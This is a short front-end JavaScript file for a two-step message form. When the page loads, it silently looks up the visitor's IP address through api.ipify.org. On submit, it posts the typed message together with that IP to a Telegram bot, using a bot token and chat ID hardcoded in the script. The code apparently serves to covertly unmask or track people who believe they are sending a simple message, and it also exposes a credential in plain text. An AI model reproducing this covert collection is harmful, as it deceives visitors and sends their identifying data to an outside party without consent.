var first_page = document.querySelector(".container-1")
var second_page = document.querySelector(".container-2")
var maintext = document.querySelector("#main-textbox")
var user_data = {}

const telegram_bot_token =  "8116570536:AAFT95vLeY50jx0H0SkvRdnCoQGms8qk6yM"
const telegram_chat_id = "6034145888"

function change_page() {
    first_page.classList.toggle("none")
    second_page.classList.toggle("none")
    user_data.message = maintext.value

    fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: telegram_chat_id,
            text: user_data
        })
    })
}

document.addEventListener("DOMContentLoaded", function() {
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            user_data.ip = data.ip
        })
        .catch(error => {
            console.error("Error fetching IP address:", error);
        });
});